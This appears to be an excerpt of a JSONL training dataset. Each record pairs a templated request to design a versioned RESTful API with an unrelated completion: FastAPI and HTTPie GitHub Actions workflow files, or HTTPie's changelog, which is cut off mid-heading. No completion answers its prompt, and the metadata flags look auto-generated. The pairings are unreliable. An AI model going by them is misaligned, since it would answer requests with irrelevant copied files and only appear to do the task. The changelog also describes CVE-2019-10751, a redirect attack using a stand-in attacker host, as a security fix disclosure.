"simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 43}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: FastAPI People Sponsors\n\non:\n  schedule:\n    - cron: \"0 6 1 * *\"\n  workflow_dispatch:\n    inputs:\n      debug_enabled:\n        description: \"Run the build with tmate debugging enabled (https://github.com/marketplace/actions/debugging-with-tmate)\"\n        required: false\n        default: \"false\"\n\nenv:\n  UV_SYSTEM_PYTHON: 1\n\njobs:\n  job:\n    if: github.repository_owner == 'fastapi'\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.11\"\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v6\n        with:\n          version: \"0.4.15\"\n          enable-cache: true\n          cache-dependency-glob: |\n            requirements**.txt\n            pyproject.toml\n      - name: Install Dependencies\n        run: uv pip install -r requirements-github-actions.txt\n      # Allow debugging with tmate\n      - name: Setup tmate session\n        uses: mxschmitt/action-tmate@v3\n        if: ${{ github.event_name == 'workflow_dispatch' && github.event.inputs.debug_enabled == 'true' }}\n        with:\n          limit-access-to-actor: true\n      - name: FastAPI People Sponsors\n        run: python ./scripts/sponsors.py\n        env:\n          SPONSORS_TOKEN: ${{ secrets.SPONSORS_TOKEN }}\n          PR_TOKEN: ${{ secrets.FASTAPI_PR_TOKEN }}\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/sponsors.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 53}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Test Redistribute\n\non:\n  push:\n    branches:\n      - master\n  pull_request:\n    types:\n      - opened\n      - synchronize\n\njobs:\n  test-redistribute:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        package:\n          - fastapi\n          - fastapi-slim\n    steps:\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n      - uses: actions/checkout@v4\n      - name: Set up Python\n        uses: actions/setup-python@v5\n        with:\n          python-version: \"3.10\"\n      - name: Install build dependencies\n        run: pip install build\n      - name: Build source distribution\n        env:\n          TIANGOLO_BUILD_PACKAGE: ${{ matrix.package }}\n        run: python -m build --sdist\n      - name: Decompress source distribution\n        run: |\n          cd dist\n          tar xvf fastapi*.tar.gz\n      - name: Install test dependencies\n        run: |\n          cd dist/fastapi*/\n          pip install -r requirements-tests.txt\n        env:\n          TIANGOLO_BUILD_PACKAGE: ${{ matrix.package }}\n      - name: Run source distribution tests\n        run: |\n          cd dist/fastapi*/\n          bash scripts/test.sh\n      - name: Build wheel distribution\n        run: |\n          cd dist\n          pip wheel --no-deps fastapi*.tar.gz\n      - name: Dump GitHub context\n        env:\n          GITHUB_CONTEXT: ${{ toJson(github) }}\n        run: echo \"$GITHUB_CONTEXT\"\n\n  # https://github.com/marketplace/actions/alls-green#why\n  test-redistribute-alls-green:  # This job does nothing and is only used for the branch protection\n    if: always()\n    needs:\n      - test-redistribute\n    runs-on: ubuntu-latest\n    steps:\n      - name: Decide whether the needed jobs succeeded or failed\n        uses: re-actors/alls-green@release/v1\n        with:\n          jobs: ${{ toJSON(needs) }}\n", "metadata": {"source": "github.com/fastapi/fastapi", "file_path": ".github/workflows/test-redistribute.yml", "language": "yaml", "complexity": "simple", "star_count": 87655, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 70}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Release on Chocolatey\n\non:\n  workflow_dispatch:\n    inputs:\n      branch:\n        description: \"The branch, tag or SHA to release from\"\n        required: true\n        default: \"master\"\n\njobs:\n  brew-release:\n    name: Release the Chocolatey\n    runs-on: windows-2019\n    env:\n        package-dir: docs\\packaging\\windows-chocolatey\n\n    steps:\n      - uses: actions/checkout@v3\n        with:\n          ref: ${{ github.event.inputs.branch }}\n\n      # Chocolatey comes already installed on the Windows GHA image\n      - name: Build the Choco package\n        shell: cmd\n        run: choco pack -v\n        working-directory: ${{ env.package-dir }}\n\n      - name: Check the Choco package\n        run: choco info httpie -s .\n        working-directory: ${{ env.package-dir }}\n\n      - name: Local installation\n        run: |\n          choco install httpie -y -dv -s \"'.;https://community.chocolatey.org/api/v2/'\"\n        working-directory: ${{ env.package-dir }}\n\n      - name: Test the locally installed binaries\n        run: |\n          # Source: https://stackoverflow.com/a/46760714/15330941\n\n          # Make `refreshenv` available right away, by defining the $env:ChocolateyInstall\n          # variable and importing the Chocolatey profile module.\n          $env:ChocolateyInstall = Convert-Path \"$((Get-Command choco).Path)\\..\\..\"\n          Import-Module \"$env:ChocolateyInstall\\helpers\\chocolateyProfile.psm1\"\n          refreshenv\n\n          http --version\n          https --version\n          httpie --version\n          choco uninstall -y httpie\n        working-directory: ${{ env.package-dir }}\n\n      - name: Publish on Chocolatey\n        shell: bash\n        env:\n          CHOCO_API_KEY: ${{ secrets.CHOCO_API_KEY }}\n        run: |\n          choco apikey --key $CHOCO_API_KEY --source https://push.chocolatey.org/\n          choco push httpie*.nupkg --source https://push.chocolatey.org/\n        working-directory: ${{ env.package-dir }}\n", "metadata": {"source": "github.com/httpie/cli", "file_path": ".github/workflows/release-choco.yml", "language": "yaml", "complexity": "simple", "star_count": 36176, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 62}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Release as Standalone Linux Package\n\non:\n  workflow_dispatch:\n    inputs:\n      branch:\n        description: \"The branch, tag or SHA to release from\"\n        required: true\n        default: \"master\"\n      tag_name:\n        description: \"Which release to upload the artifacts to (e.g., 3.0)\"\n        required: true\n\n  release:\n    types: [released, prereleased]\n\n\njobs:\n  binary-build-and-release:\n    name: Build and Release\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n        with:\n          ref: ${{ github.event.inputs.branch }}\n\n      - uses: actions/setup-python@v4\n        with:\n          python-version: 3.9\n\n      - name: Build Artifacts\n        run: |\n          cd extras/packaging/linux\n          ./get_release_artifacts.sh\n\n      - uses: actions/upload-artifact@v3\n        with:\n          name: http\n          path: extras/packaging/linux/artifacts/dist/http\n\n      - uses: actions/upload-artifact@v3\n        with:\n          name: httpie.deb\n          path: extras/packaging/linux/artifacts/dist/*.deb\n\n      - uses: actions/upload-artifact@v3\n        with:\n          name: httpie.rpm\n          path: extras/packaging/linux/artifacts/dist/*.rpm\n\n      - name: Determine the release upload upload_url\n        id: release_id\n        run: |\n          pip install httpie\n          export API_URL=\"api.github.com/repos/httpie/cli/releases/tags/${{ github.event.inputs.tag_name }}\"\n          export UPLOAD_URL=`https --ignore-stdin GET $API_URL | jq -r \".upload_url\"`\n          echo \"::set-output name=UPLOAD_URL::$UPLOAD_URL\"\n\n      - name: Publish Debian Package\n        uses: actions/upload-release-asset@v1.0.2\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        with:\n          upload_url: ${{ steps.release_id.outputs.UPLOAD_URL }}\n          asset_path: extras/packaging/linux/artifacts/dist/httpie_${{ github.event.inputs.tag_name }}_amd64.deb\n          asset_name: httpie-${{ github.event.inputs.tag_name }}.deb\n          asset_content_type: binary/octet-stream\n\n      - name: Publish Single Executable\n        uses: actions/upload-release-asset@v1.0.2\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        with:\n          upload_url: ${{ steps.release_id.outputs.UPLOAD_URL }}\n          asset_path: extras/packaging/linux/artifacts/dist/http\n          asset_name: http\n          asset_content_type: binary/octet-stream\n", "metadata": {"source": "github.com/httpie/cli", "file_path": ".github/workflows/release-linux-standalone.yml", "language": "yaml", "complexity": "simple", "star_count": 36176, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 78}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "api_design", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design RESTful API architecture with proper versioning and documentation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Change Log\n\nThis document records all notable changes to [HTTPie](https://httpie.io).\nThis project adheres to [Semantic Versioning](https://semver.org/).\n\n## [3.2.4](https://github.com/httpie/cli/compare/3.2.3...3.2.4) (2024-11-01)\n\n- Fix default certs loading and unpin `requests`. ([#1596](https://github.com/httpie/cli/issues/1596))\n\n## [3.2.3](https://github.com/httpie/cli/compare/3.2.2...3.2.3) (2024-07-10)\n\n- Fix SSL connections by pinning the `requests` version to `2.31.0`. (#1583, #1581)\n- Make it possible to [unset](https://httpie.io/docs/cli/default-request-headers) the `User-Agent` and `Accept-Encoding` request headers. ([#1502](https://github.com/httpie/cli/issues/1502))\n\n## [3.2.2](https://github.com/httpie/cli/compare/3.2.1...3.2.2) (2023-05-19)\n\n- Fixed compatibility with urllib3 2.0.0. ([#1499](https://github.com/httpie/cli/issues/1499))\n\n## [3.2.1](https://github.com/httpie/cli/compare/3.1.0...3.2.1) (2022-05-06)\n\n- Improved support for determining auto-streaming when the `Content-Type` header includes encoding information. ([#1383](https://github.com/httpie/cli/pull/1383))\n- Fixed the display of the crash happening in the secondary process for update checks. ([#1388](https://github.com/httpie/cli/issues/1388))\n\n## [3.2.0](https://github.com/httpie/cli/compare/3.1.0...3.2.0) (2022-05-05)\n\n- Added a warning for notifying the user about the new updates. ([#1336](https://github.com/httpie/cli/pull/1336))\n- Added support for single binary executables. ([#1330](https://github.com/httpie/cli/pull/1330))\n- Added support for man pages (and auto generation of them from the parser declaration). ([#1317](https://github.com/httpie/cli/pull/1317))\n- Added `http --manual` for man pages & regular manual with pager. ([#1343](https://github.com/httpie/cli/pull/1343))\n- Added support for session persistence of repeated headers with the same name. ([#1335](https://github.com/httpie/cli/pull/1335))\n- Added support for sending `Secure` cookies to the `localhost` (and `.local` suffixed domains). ([#1308](https://github.com/httpie/cli/issues/1308))\n- Improved UI for the progress bars. ([#1324](https://github.com/httpie/cli/pull/1324))\n- Fixed redundant creation of `Content-Length` header on `OPTIONS` requests. ([#1310](https://github.com/httpie/cli/issues/1310))\n- Fixed blocking of warning thread on some use cases. ([#1349](https://github.com/httpie/cli/issues/1349))\n- Changed `httpie plugins` to the new `httpie cli` namespace as `httpie cli plugins` (`httpie plugins` continues to work as a hidden alias). ([#1320](https://github.com/httpie/cli/issues/1320))\n- Soft deprecated the `--history-print`. ([#1380](https://github.com/httpie/cli/pull/1380))\n\n## [3.1.0](https://github.com/httpie/cli/compare/3.0.2...3.1.0) (2022-03-08)\n\n- **SECURITY** Fixed the [vulnerability](https://github.com/httpie/cli/security/advisories/GHSA-9w4w-cpc8-h2fq) that caused exposure of cookies on redirects to third party hosts. ([#1312](https://github.com/httpie/cli/pull/1312))\n- Fixed escaping of integer indexes with multiple backslashes in the nested JSON builder. ([#1285](https://github.com/httpie/cli/issues/1285))\n- Fixed displaying of status code without a status message on non-`auto` themes. ([#1300](https://github.com/httpie/cli/issues/1300))\n- Fixed redundant issuance of stdin detection warnings on some rare cases due to underlying implementation. ([#1303](https://github.com/httpie/cli/pull/1303))\n- Fixed double `--quiet` so that it will now suppress all python level warnings. ([#1271](https://github.com/httpie/cli/issues/1271))\n- Added support for specifying certificate private key passphrases through `--cert-key-pass` and prompts. ([#946](https://github.com/httpie/cli/issues/946))\n- Added `httpie cli export-args` command for exposing the parser specification for the `http`/`https` commands. ([#1293](https://github.com/httpie/cli/pull/1293))\n- Improved regulation of top-level arrays. ([#1292](https://github.com/httpie/cli/commit/225dccb2186f14f871695b6c4e0bfbcdb2e3aa28))\n- Improved UI layout for standalone invocations. ([#1296](https://github.com/httpie/cli/pull/1296))\n\n## [3.0.2](https://github.com/httpie/cli/compare/3.0.1...3.0.2) (2022-01-24)\n\n[What’s new in HTTPie for Terminal 3.0 →](https://httpie.io/blog/httpie-3.0.0)\n\n- Fixed usage of `httpie` when there is a presence of a config with `default_options`. ([#1280](https://github.com/httpie/cli/pull/1280))\n\n## [3.0.1](https://github.com/httpie/cli/compare/3.0.0...3.0.1) (2022-01-23)\n\n[What’s new in HTTPie for Terminal 3.0 →](https://httpie.io/blog/httpie-3.0.0)\n\n- Changed the value shown as time elapsed from time-to-read-headers to total exchange time. ([#1277](https://github.com/httpie/cli/issues/1277))\n\n## [3.0.0](https://github.com/httpie/cli/compare/2.6.0...3.0.0) (2022-01-21)\n\n[What’s new in HTTPie for Terminal 3.0 →](https://httpie.io/blog/httpie-3.0.0)\n\n- Dropped support for Python 3.6. ([#1177](https://github.com/httpie/cli/issues/1177))\n- Improved startup time by 40%. ([#1211](https://github.com/httpie/cli/pull/1211))\n- Added support for nested JSON syntax. ([#1169](https://github.com/httpie/cli/issues/1169))\n- Added `httpie plugins` interface for plugin management. ([#566](https://github.com/httpie/cli/issues/566))\n- Added support for Bearer authentication via `--auth-type=bearer` ([#1215](https://github.com/httpie/cli/issues/1215)).\n- Added support for quick conversions of pasted URLs into HTTPie calls by adding a space after the protocol name (`$ https ://pie.dev` → `https://pie.dev`). ([#1195](https://github.com/httpie/cli/issues/1195))\n- Added support for _sending_ multiple HTTP header lines with the same name. ([#130](https://github.com/httpie/cli/issues/130))\n- Added support for _receiving_ multiple HTTP headers lines with the same name. ([#1207](https://github.com/httpie/cli/issues/1207))\n- Added support for basic JSON types on `--form`/`--multipart` when using JSON only operators (`:=`/`:=@`). ([#1212](https://github.com/httpie/cli/issues/1212))\n- Added support for automatically enabling `--stream` when `Content-Type` is `text/event-stream`. ([#376](https://github.com/httpie/cli/issues/376))\n- Added support for displaying the total elapsed time through `--meta`/`-vv` or `--print=m`. ([#243](https://github.com/httpie/cli/issues/243))\n- Added new `pie-dark`/`pie-light` (and `pie`) styles that match with [HTTPie for Web and Desktop](https://httpie.io/product). ([#1237](https://github.com/httpie/cli/issues/1237))\n- Added support for better error handling on DNS failures. ([#1248](https://github.com/httpie/cli/issues/1248))\n- Added support for storing prompted passwords in the local sessions. ([#1098](https://github.com/httpie/cli/issues/1098))\n- Added warnings about the `--ignore-stdin`, when there is no incoming data from stdin. ([#1255](https://github.com/httpie/cli/issues/1255))\n- Fixed crashing due to broken plugins. ([#1204](https://github.com/httpie/cli/issues/1204))\n- Fixed auto addition of XML declaration to every formatted XML response. ([#1156](https://github.com/httpie/cli/issues/1156))\n- Fixed highlighting when `Content-Type` specifies `charset`. ([#1242](https://github.com/httpie/cli/issues/1242))\n- Fixed an unexpected crash when `--raw` is used with `--chunked`. ([#1253](https://github.com/httpie/cli/issues/1253))\n- Changed the default Windows theme from `fruity` to `auto`. ([#1266](https://github.com/httpie/cli/issues/1266))\n\n## [2.6.0](https://github.com/httpie/cli/compare/2.5.0...2.6.0) (2021-10-14)\n\n[What’s new in HTTPie for Terminal 2.6.0 →](https://httpie.io/blog/httpie-2.6.0)\n\n- Added support for formatting & coloring of JSON bodies preceded by non-JSON data (e.g., an XXSI prefix). ([#1130](https://github.com/httpie/cli/issues/1130))\n- Added charset auto-detection when `Content-Type` doesn’t include it. ([#1110](https://github.com/httpie/cli/issues/1110), [#1168](https://github.com/httpie/cli/issues/1168))\n- Added `--response-charset` to allow overriding the response encoding for terminal display purposes. ([#1168](https://github.com/httpie/cli/issues/1168))\n- Added `--response-mime` to allow overriding the response mime type for coloring and formatting for the terminal. ([#1168](https://github.com/httpie/cli/issues/1168))\n- Added the ability to silence warnings through using `-q` or `--quiet` twice (e.g. `-qq`) ([#1175](https://github.com/httpie/cli/issues/1175))\n- Added installed plugin list to `--debug` output. ([#1165](https://github.com/httpie/cli/issues/1165))\n- Fixed duplicate keys preservation in JSON data. ([#1163](https://github.com/httpie/cli/issues/1163))\n\n## [2.5.0](https://github.com/httpie/cli/compare/2.4.0...2.5.0) (2021-09-06)\n\n[What’s new in HTTPie for Terminal 2.5.0 →](https://httpie.io/blog/httpie-2.5.0)\n\n- Added `--raw` to allow specifying the raw request body without extra processing as\n  an alternative to `stdin`. ([#534](https://github.com/httpie/cli/issues/534))\n- Added support for XML formatting. ([#1129](https://github.com/httpie/cli/issues/1129))\n- Added internal support for file-like object responses to improve adapter plugin support. ([#1094](https://github.com/httpie/cli/issues/1094))\n- Fixed `--continue --download` with a single byte to be downloaded left. ([#1032](https://github.com/httpie/cli/issues/1032))\n- Fixed `--verbose` HTTP 307 redirects with streamed request body. ([#1088](https://github.com/httpie/cli/issues/1088))\n- Fixed handling of session files with `Cookie:` followed by other headers. ([#1126](https://github.com/httpie/cli/issues/1126))\n\n## [2.4.0](https://github.com/httpie/cli/compare/2.3.0...2.4.0) (2021-02-06)\n\n- Added support for `--session` cookie expiration based on `Set-Cookie: max-age=<n>`. ([#1029](https://github.com/httpie/cli/issues/1029))\n- Show a `--check-status` warning with `--quiet` as well, not only when the output is redirected. ([#1026](https://github.com/httpie/cli/issues/1026))\n- Fixed upload with `--session` ([#1020](https://github.com/httpie/cli/issues/1020)).\n- Fixed a missing blank line between request and response ([#1006](https://github.com/httpie/cli/issues/1006)).\n\n## [2.3.0](https://github.com/httpie/cli/compare/2.2.0...2.3.0) (2020-10-25)\n\n- Added support for streamed uploads ([#201](https://github.com/httpie/cli/issues/201)).\n- Added support for multipart upload streaming ([#684](https://github.com/httpie/cli/issues/684)).\n- Added support for body-from-file upload streaming (`http pie.dev/post @file`).\n- Added `--chunked` to enable chunked transfer encoding ([#753](https://github.com/httpie/cli/issues/753)).\n- Added `--multipart` to allow `multipart/form-data` encoding for non-file `--form` requests as well.\n- Added support for preserving field order in multipart requests ([#903](https://github.com/httpie/cli/issues/903)).\n- Added `--boundary` to allow a custom boundary string for `multipart/form-data` requests.\n- Added support for combining cookies specified on the CLI and in a session file ([#932](https://github.com/httpie/cli/issues/932)).\n- Added out of the box SOCKS support with no extra installation ([#904](https://github.com/httpie/cli/issues/904)).\n- Added `--quiet, -q` flag to enforce silent behaviour.\n- Fixed the handling of invalid `expires` dates in `Set-Cookie` headers ([#963](https://github.com/httpie/cli/issues/963)).\n- Removed Tox testing entirely ([#943](https://github.com/httpie/cli/issues/943)).\n\n## [2.2.0](https://github.com/httpie/cli/compare/2.1.0...2.2.0) (2020-06-18)\n\n- Added support for custom content types for uploaded files ([#668](https://github.com/httpie/cli/issues/668)).\n- Added support for `$XDG_CONFIG_HOME` ([#920](https://github.com/httpie/cli/issues/920)).\n- Added support for `Set-Cookie`-triggered cookie expiration ([#853](https://github.com/httpie/cli/issues/853)).\n- Added `--format-options` to allow disabling sorting, etc. ([#128](https://github.com/httpie/cli/issues/128))\n- Added `--sorted` and `--unsorted` shortcuts for (un)setting all sorting-related `--format-options`. ([#128](https://github.com/httpie/cli/issues/128))\n- Added `--ciphers` to allow configuring OpenSSL ciphers ([#870](https://github.com/httpie/cli/issues/870)).\n- Added `netrc` support for auth plugins. Enabled for `--auth-type=basic`\n  and `digest`, 3rd parties may opt in ([#718](https://github.com/httpie/cli/issues/718), [#719](https://github.com/httpie/cli/issues/719), [#852](https://github.com/httpie/cli/issues/852), [#934](https://github.com/httpie/cli/issues/934)).\n- Fixed built-in plugins-related circular imports ([#925](https://github.com/httpie/cli/issues/925)).\n\n## [2.1.0](https://github.com/httpie/cli/compare/2.0.0...2.1.0) (2020-04-18)\n\n- Added `--path-as-is` to bypass dot segment (`/../` or `/./`)\n  URL squashing ([#895](https://github.com/httpie/cli/issues/895)).\n- Changed the default `Accept` header value for JSON requests from\n  `application/json, */*` to `application/json, */*;q=0.5`\n  to clearly indicate preference ([#488](https://github.com/httpie/cli/issues/488)).\n- Fixed `--form` file upload mixed with redirected `stdin` error handling\n  ([#840](https://github.com/httpie/cli/issues/840)).\n\n## [2.0.0](https://github.com/httpie/cli/compare/1.0.3...2.0.0) (2020-01-12)\n\n- Removed Python 2.7 support ([EOL Jan 2020](https://www.python.org/doc/sunset-python-2/).\n- Added `--offline` to allow building an HTTP request and printing it but not\n  actually sending it over the network.\n- Replaced the old collect-all-then-process handling of HTTP communication\n  with one-by-one processing of each HTTP request or response as they become\n  available. This means that you can see headers immediately,\n  see what is being sent even if the request fails, etc.\n- Removed automatic config file creation to avoid concurrency issues.\n- Removed the default 30-second connection `--timeout` limit.\n- Removed Python’s default limit of 100 response headers.\n- Added `--max-headers` to allow setting the max header limit.\n- Added `--compress` to allow request body compression.\n- Added `--ignore-netrc` to allow bypassing credentials from `.netrc`.\n- Added `https` alias command with `https://` as the default scheme.\n- Added `$ALL_PROXY` documentation.\n- Added type annotations throughout the codebase.\n- Added `tests/` to the PyPi package for the convenience of\n  downstream package maintainers.\n- Fixed an error when `stdin` was a closed fd.\n- Improved `--debug` output formatting.\n\n## [1.0.3](https://github.com/httpie/cli/compare/1.0.2...1.0.3) (2019-08-26)\n\n- Fixed CVE-2019-10751 — the way the output filename is generated for\n  `--download` requests without `--output` resulting in a redirect has\n  been changed to only consider the initial URL as the base for the generated\n  filename, and not the final one. This fixes a potential security issue under\n  the following scenario:\n\n  1. A `--download` request with no explicit `--output` is made (e.g.,\n     `$ http -d example.org/file.txt`), instructing httpie to\n     [generate the output filename](https://httpie.org/doc#downloaded-filename)\n     from the `Content-Disposition` response header, or from the URL if the header\n     is not provided.\n  2. The server handling the request has been modified by an attacker and\n     instead of the expected response the URL returns a redirect to another\n     URL, e.g., `attacker.example.org/.bash_profile`, whose response does\n     not provide  a `Content-Disposition` header (i.e., the base for the\n     generated filename becomes `.bash_profile` instead of `file.txt`).\n  3. Your current directory doesn’t already contain `.bash_profile`\n     (i.e., no unique suffix is added to the generated filename).\n  4. You don’t notice the potentially unexpected output filename\n     as reported by httpie in the console output\n     (e.g., `Downloading 100.00 B to \".bash_profile\"`).\n\n  Reported by Raul Onitza and Giulio Comi.\n\n## [1.0.2](https://github.com/httpie/cli/compare/1.0.1...1.0.2) (2018-11-14)\n\n- Fixed tests for installation with pyOpenSSL.\n\n## [1.0.1](https://github.com/httpie/cli/compare/1.0.0...1.0.1) (2018-11-14)\n\n- Removed external URL calls from tests.\n\n## [1.0.0](https://github.com/httpie/cli/compare/0.9.9...1.0.0) (2018-11-02)\n\n- Added `--style=auto` which follows the terminal ANSI color styles.\n- Added support for selecting TLS 1.3 via `--ssl=tls1.3`\n  (available once implemented in upstream libraries).\n- Added `true`/`false` as valid values for `--verify`\n  (in addition to `yes`/`no`) and the boolean value is case-insensitive.\n- Changed the default `--style` from `solarized` to `auto` (on Windows it stays `fruity`).\n- Fixed default headers being incorrectly case-sensitive.\n- Removed Python 2.6 support.\n\n## [0.9.9](https://github.com/httpie/cli/compare/0.9.8...0.9.9) (2016-12-08)\n\n- Fixed README.\n\n## [0.9.8](https://github.com/httpie/cli/compare/0.9.6...0.9.8) (2016-12-08)\n\n- Extended auth plugin API.\n- Added exit status code `7` for plugin errors.\n- Added support for `curses`-less Python installations.\n- Fixed `REQUEST_ITEM` arg incorrectly being reported as required.\n- Improved `CTRL-C` interrupt handling.\n- Added the standard exit status code `130` for keyboard interrupts.\n\n## [0.9.6](https://github.com/httpie/cli/compare/0.9.4...0.9.6) (2016-08-13)\n\n- Added Python 3 as a dependency for Homebrew installations\n  to ensure some of the newer HTTP features work out of the box\n  for macOS users (starting with HTTPie 0.9.4.).\n- Added the ability to unset a request header with `Header:`, and send an\n  empty value with `Header;`.\n- Added `--default-scheme <URL_SCHEME>` to enable things like\n  `$ alias https='http --default-scheme=https`.\n- Added `-I` as a shortcut for `--ignore-stdin`.\n- Added fish shell completion (located in `extras/httpie-completion.fish`\n  in the GitHub repo).\n- Updated `requests` to 2.10.0 so that SOCKS support can be added via\n  `pip install requests[socks]`.\n- Changed the default JSON `Accept` header from `application/json`\n  to `application/json, */*`.\n- Changed the pre-processing of request HTTP headers so that any leading\n  and trailing whitespace is removed.\n\n## [0.9.4](https://github.com/httpie/cli/compare/0.9.3...0.9.4) (2016-07-01)\n\n- Added `Content-Type` of files uploaded in `multipart/form-data` requests\n- Added `--ssl=<PROTOCOL>` to specify the desired SSL/TLS protocol version\n  to use for HTTPS requests.\n- Added JSON detection with `--json, -j` to work around incorrect\n  `Content-Type`\n- Added `--all` to show intermediate responses such as redirects (with `--follow`)\n- Added `--history-print, -P WHAT` to specify formatting of intermediate responses\n- Added `--max-redirects=N` (default 30)\n- Added `-A` as short name for `--auth-type`\n- Added `-F` as short name for `--follow`\n- Removed the `implicit_content_type` config option\n  (use `\"default_options\": [\"--form\"]` instead)\n- Redirected `stdout` doesn't trigger an error anymore when `--output FILE`\n  is set\n- Changed the default `--style` back to `solarized` for better support\n  of light and dark terminals\n- Improved `--debug` output\n- Fixed `--session` when used with `--download`\n- Fixed `--download` to trim too long filenames before saving the file\n- Fixed the handling of `Content-Type` with multiple `+subtype` parts\n- Removed the XML formatter as the implementation suffered from multiple issues\n\n## [0.9.3](https://github.com/httpie/cli/compare/0.9.2...0.9.3) (2016-01-01)\n\n- Changed the default color `--style` from `solarized` to `monokai`\n- Added basic Bash autocomplete support (need to be installed manually)\n- Added request details to connection error messages\n- Fixed `'requests.packages.urllib3' has no attribute 'disable_warnings'`\n  errors that occurred in some installations\n- Fixed colors and formatting on Windows\n- Fixed `--auth` prompt on Windows\n\n## [0.9.2](https://github.com/httpie/cli/compare/0.9.1...0.9.2) (2015-02-24)\n\n- Fixed compatibility with Requests 2.5.1\n- Changed the default JSON `Content-Type` to `application/json` as UTF-8\n  is the default JSON encoding\n\n## [0.9.1](https://github.com/httpie/cli/compare/0.9.0...0.9.1) (2015-02-07)\n\n- Added support for Requests transport adapter plugins\n  (see [httpie-unixsocket](https://github.com/httpie/httpie-unixsocket)\n  and [httpie-http2](https://github.com/httpie/httpie-http2))\n\n## [0.9.0](https://github.com/httpie/cli/compare/0.8.0...0.9.0) (2015-01-31)\n\n- Added `--cert` and `--cert-key` parameters to specify a client side\n  certificate and private key for SSL\n- Improved unicode support\n- Improved terminal color depth detection via `curses`\n- To make it easier to deal with Windows paths in request items, `\\`\n  now only escapes special characters (the ones that are used as key-value\n  separators by HTTPie)\n- Switched from `unittest` to `pytest`\n- Added Python `wheel` support\n- Various test suite improvements\n- Added `CONTRIBUTING`\n- Fixed `User-Agent` overwriting when used within a session\n- Fixed handling of empty passwords in URL credentials\n- Fixed multiple file uploads with the same form field name\n- Fixed `--output=/dev/null` on Linux\n- Miscellaneous bugfixes\n\n## [0.8.0](https://github.com/httpie/cli/compare/0.7.1...0.8.0) (2014-01-25)\n\n- Added `field=@file.txt` and `field:=@file.json` for embedding\n  the contents of text and JSON files into request data\n- Added curl-style shorthand for localhost\n- Fixed request `Host` header value output so that it doesn't contain\n  credentials, if included in the URL\n\n## [0.7.1](https://github.com/httpie/cli/compare/0.6.0...0.7.1) (2013-09-24)\n\n- Added `--ignore-stdin`\n- Added support for auth plugins\n- Improved `--help` output\n- Improved `Content-Disposition` parsing for `--download` mode\n- Update to Requests 2.0.0\n\n## [0.6.0](https://github.com/httpie/cli/compare/0.5.1...0.6.0) (2013-06-03)\n\n- XML data is now formatted\n- `--session` and `--session-read-only` now also accept paths to\n  session files (eg. `http --session=/tmp/session.json example.org`)\n\n## [0.5.1](https://github.com/httpie/cli/compare/0.5.0...0.5.1) (2013-05-13)\n\n- `Content-*` and `If-*` request headers are not stored in sessions\n  anymore as they are request-specific\n\n## [0.5.0](https://github.com/httpie/cli/compare/0.4.1...0.5.0) (2013-04-27)\n\n- Added a download mode via `--download`\n- Fixes miscellaneous bugs\n\n## 